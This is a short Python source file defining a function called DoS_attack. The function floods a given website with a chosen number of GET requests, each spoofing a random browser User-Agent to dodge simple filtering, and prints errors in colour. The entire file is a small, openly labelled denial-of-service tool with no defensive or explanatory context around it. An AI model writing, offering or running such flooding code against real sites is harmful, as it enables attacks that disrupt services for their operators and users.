from colorama import init
from termcolor import colored
import requests
from fake_useragent import UserAgent

init()

def DoS_attack(site, packets):
    try:
        for _ in range(0, packets):
            requests.get(site, headers={"User-Agent": UserAgent().random})
    except Exception as e:
        print(colored(f"[ERROR] {e}", "red"))